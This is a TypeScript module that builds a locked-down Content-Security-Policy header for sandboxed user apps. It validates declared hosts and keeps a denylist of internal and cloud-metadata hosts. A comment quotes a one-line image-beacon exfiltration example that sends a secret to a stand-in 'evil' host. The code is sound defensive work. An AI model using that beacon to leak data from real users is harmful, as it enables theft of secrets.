/**
 * Compile a creation's Content-Security-Policy from its declared network hosts.
 *
 * Two rules carry the whole design:
 *
 *  1. `script-src` is always `'self'` and is never influenced by the manifest.
 *     That is the mechanism that enforces vendoring. Without it, "everything is
 *     vendored" is a policy nobody checks.
 *
 *  2. Declared hosts reach `connect-src`, `img-src`, `media-src` and `font-src`.
 *     The `img-src` clause is not optional: `new Image().src = 'https://evil/?'
 *     + secret` needs no response to leak, so locking `fetch` alone leaves the
 *     exfiltration channel wide open.
 *
 * The result is compiled at publish time and frozen on the version row, then
 * served verbatim. It is never recomputed per request from the manifest,
 * because a human approved that exact string, and a mutable input to a reviewed
 * security decision is not a security decision.
 */

import type { Manifest } from '@townsquare/manifest'

/** Hosts that must never appear, regardless of what the manifest declares. */
const DENIED_HOST_SUFFIXES = [
  '.localhost',
  '.local',
  '.internal',
  '.home.arpa',
  '.onion',
  '.test',
  '.invalid',
]
const DENIED_HOSTS = new Set(['localhost', 'metadata.google.internal'])

/**
 * A dotted name whose final label is alphabetic.
 *
 * The alphabetic-TLD requirement is what rejects a bare IP literal. An earlier
 * version allowed digits in every label, so `127.0.0.1` parsed as a perfectly
 * good "hostname" and sailed past the loopback denylist, which only matched the
 * string `localhost`. Declaring an IP is never legitimate here and would let a
 * creation reach a private range the reviewer cannot resolve.
 */
const HOSTNAME = /^(?=.{1,253}$)([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/

export class CspCompileError extends Error {}

/**
 * Reject anything that is not a plain lowercase ASCII hostname.
 *
 * The manifest schema already checks this. It is checked again here because
 * this function emits a security header, and a header builder that trusts its
 * caller is one refactor away from header injection. `;` or a space in a
 * "hostname" would let a declared value append its own directive.
 */
function assertSafeHost(host: string): void {
  if (host !== host.toLowerCase()) {
    throw new CspCompileError(`host must be lowercase: ${JSON.stringify(host)}`)
  }
  if (!HOSTNAME.test(host)) {
    throw new CspCompileError(`not a bare hostname: ${JSON.stringify(host)}`)
  }
  // Belt and braces over the regex: these are the characters that would let a
  // value break out of its directive.
  if (/[;,'"\s\\()*]/.test(host)) {
    throw new CspCompileError(`host contains forbidden characters: ${JSON.stringify(host)}`)
  }
  if (DENIED_HOSTS.has(host) || DENIED_HOST_SUFFIXES.some((s) => host.endsWith(s))) {
    throw new CspCompileError(`host is not allowed: ${host}`)
  }
}

export interface CompileCspOptions {
  /** Where CSP violation reports are sent. Omit to disable reporting. */
  reportUri?: string
}

/**
 * @returns the exact `Content-Security-Policy` header value to serve.
 */
export function compileCsp(manifest: Manifest, opts: CompileCspOptions = {}): string {
  const hosts = [...new Set(manifest.permissions.network)].sort()
  for (const h of hosts) assertSafeHost(h)

  // Every declared host is pinned to https. A creation cannot opt into cleartext,
  // which would expose residents on shared networks and is never necessary.
  const declared = hosts.map((h) => `https://${h}`)
  const withDeclared = (base: string[]): string => [...base, ...declared].join(' ')

  const directives: string[] = [
    // Deny everything, then re-grant narrowly. A directive we forget to name
    // therefore fails closed rather than inheriting something permissive.
    `default-src 'none'`,

    // The vendoring gate. Never widened by the manifest.
    `script-src 'self'`,

    // 'unsafe-inline' for styles only. Generated apps use inline styles
    // constantly, and style injection inside an already-untrusted, already-
    // isolated frame buys an attacker nothing they do not already have.
    `style-src 'self' 'unsafe-inline'`,

    // data: for images is how generated code inlines small icons.
    withDeclared([`img-src 'self'`, 'data:']),
    withDeclared([`font-src 'self'`, 'data:']),
    withDeclared([`media-src 'self'`]),
    withDeclared([`connect-src 'self'`]),

    // A creation may not frame anything, and may not be framed by anyone but us.
    `frame-src 'none'`,
    `child-src 'none'`,
    `object-src 'none'`,

    // No plugins, no base tag rewriting, no form posts anywhere.
    `base-uri 'none'`,
    `form-action 'none'`,

    // Workers stay same-origin so they cannot become an unpoliced fetch context.
    `worker-src 'self'`,

    // Belt and braces with the iframe `sandbox` attribute on the host side.
    `frame-ancestors 'self'`,
  ]

  if (opts.reportUri) {
    if (/[;,\s]/.test(opts.reportUri)) {
      throw new CspCompileError('reportUri contains forbidden characters')
    }
    directives.push(`report-uri ${opts.reportUri}`)
  }

  return directives.join('; ')
}

/**
 * The hosts a creation is allowed to reach, for the reviewer's screen.
 *
 * Kept beside the compiler so the reviewer sees the same list the header
 * encodes rather than a separately-derived one that could drift.
 */
export function declaredHosts(manifest: Manifest): string[] {
  return [...new Set(manifest.permissions.network)].sort()
}
